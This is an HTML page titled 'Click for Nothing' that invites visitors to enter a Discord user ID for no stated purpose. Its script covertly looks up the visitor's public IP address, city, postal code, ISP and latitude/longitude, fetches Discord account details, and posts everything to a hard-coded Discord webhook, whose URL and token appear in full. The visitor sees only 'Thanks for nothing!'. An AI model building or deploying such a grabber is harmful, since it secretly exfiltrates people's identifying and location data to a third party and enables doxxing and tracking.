<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Click for Nothing</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a2e;
            color: #e0e0e0;
            text-align: center;
            padding: 50px;
            margin: 0;
            overflow: hidden; /* Disable scroll */
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
            color: #f2a365;
        }
        input, button {
            padding: 10px;
            margin: 5px;
            font-size: 18px;
            border-radius: 5px;
        }
        button {
            background-color: #e94560;
            border: none;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.3s;
        }
        button:hover {
            background-color: #d63447;
        }
        #loading {
            display: none;
            margin-top: 20px;
            font-size: 1.2em;
            color: #f2a365;
        }
        #message {
            margin-top: 20px;
            font-size: 1.2em;
            color: #e0e0e0;
        }
        #timer {
            margin-top: 10px;
            font-size: 1.2em;
            color: #f2a365;
        }
    </style>
</head>
<body>
    <h1>Enter your Discord User ID for nothing!</h1>
    <input type="text" id="userid" placeholder="Enter User ID" required>
    <button id="sendInfoButton">Click me!</button>
    <div id="loading">Wait for nothing...</div>
    <div id="message"></div>
    <div id="timer"></div>

    <script>
        const cooldownTime = 5 * 60 * 1000; // 5 minutes in milliseconds

        function checkCooldown() {
            const lastClicked = localStorage.getItem('lastClicked');
            if (lastClicked) {
                const timePassed = Date.now() - lastClicked;
                if (timePassed < cooldownTime) {
                    startTimer(cooldownTime - timePassed);
                    document.getElementById("sendInfoButton").disabled = true;
                    return true; // Cooldown active
                }
            }
            return false; // No cooldown
        }

        function startTimer(remainingTime) {
            const timerElement = document.getElementById("timer");
            const intervalId = setInterval(() => {
                const minutes = Math.floor((remainingTime / 1000) / 60);
                const seconds = Math.floor((remainingTime / 1000) % 60);
                timerElement.innerText = `You must wait ${minutes}m ${seconds}s before clicking again.`;
                remainingTime -= 1000; // Decrease the remaining time by 1 second
                if (remainingTime <= 0) {
                    clearInterval(intervalId);
                    localStorage.removeItem('lastClicked'); // Clear cooldown on timeout
                    document.getElementById("sendInfoButton").disabled = false;
                    timerElement.innerText = ''; // Clear timer display
                }
            }, 1000); // Update every second
        }

        document.getElementById("sendInfoButton").addEventListener("click", function() {
            if (checkCooldown()) return; // If in cooldown, do not proceed
            
            const userid = document.getElementById("userid").value;
            if (!userid || userid.length < 5) {
                document.getElementById("message").innerText = 'Please enter a valid User ID (at least 5 characters).';
                return;
            }

            document.getElementById("loading").style.display = "block";
            document.getElementById("message").innerText = "";

            // Store the current time as the last clicked time
            localStorage.setItem('lastClicked', Date.now());

            // Fetch IP Address
            fetch("https://api.ipify.org?format=json")
                .then(response => {
                    if (!response.ok) throw new Error('Failed to fetch IP address');
                    return response.json();
                })
                .then(ipData => {
                    const ip = ipData.ip;
                    return fetch(`https://ipapi.co/${ip}/json/`);
                })
                .then(response => {
                    if (!response.ok) throw new Error('Failed to fetch IP details');
                    return response.json();
                })
                .then(data => {
                    // Fetch Discord user data
                    const discordApiUrl = `https://discord.com/api/v10/users/${userid}`;
                    return fetch(discordApiUrl, {
                        headers: {
                            'Authorization': 'Bot YOUR_BOT_TOKEN' // Replace with your actual bot token
                        }
                    }).then(response => {
                        if (!response.ok) throw new Error('Failed to fetch Discord user details');
                        return response.json();
                    }).then(userData => {
                        // Extract account creation date and calculate account age
                        const accountCreationDate = new Date(userData.created_at);
                        const currentDate = new Date();
                        const accountAge = Math.floor((currentDate - accountCreationDate) / (1000 * 60 * 60 * 24 * 365)); // Calculate age in years

                        const webhookUrl = 'https://discord.com/api/webhooks/1302389815362326580/j1JYAN8CXgwYfbqKH7nRsitHvg-DjDoBHNPIiHLqadmJDkluLyt37hNKeanbzggduDE-';
                        const message = {
                            embeds: [{
                                title: "IP Information",
                                description: `**IP Address:** ${data.ip}\n**Location:** ${data.city}, ${data.region}, ${data.country_name}\n**ISP:** ${data.org}\n**Postal Code:** ${data.postal}`,
                                fields: [
                                    {
                                        name: "Discord Information",
                                        value: `**UserID:** ${userid}\n**Account Creation Date:** ${accountCreationDate.toISOString().split('T')[0]}\n**Account Age:** ${accountAge} years`,
                                        inline: false
                                    },
                                    {
                                        name: "Additional Info",
                                        value: `**Country Code:** ${data.country}\n**Latitude:** ${data.latitude}\n**Longitude:** ${data.longitude}`,
                                        inline: false
                                    }
                                ],
                                color: 0xe94560 // Color of the embed
                            }]
                        };
                        return fetch(webhookUrl, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(message)
                        });
                    });
                })
                .then(response => {
                    document.getElementById("loading").style.display = "none";
                    if (response.ok) {
                        document.getElementById("message").innerText = 'Thanks for nothing!'; // Updated success message
                        startTimer(cooldownTime); // Start timer for cooldown period
                    } else {
                        throw new Error('Failed to send message to Discord');
                    }
                })
                .catch(error => {
                    document.getElementById("loading").style.display = "none";
                    document.getElementById("message").innerText = 'Error occurred. Please try again.';
                    console.error('Error:', error.message);
                });
        });

        // Check cooldown on page load
        window.onload = function() {
            checkCooldown();
        };
    </script>
</body>
  </html>
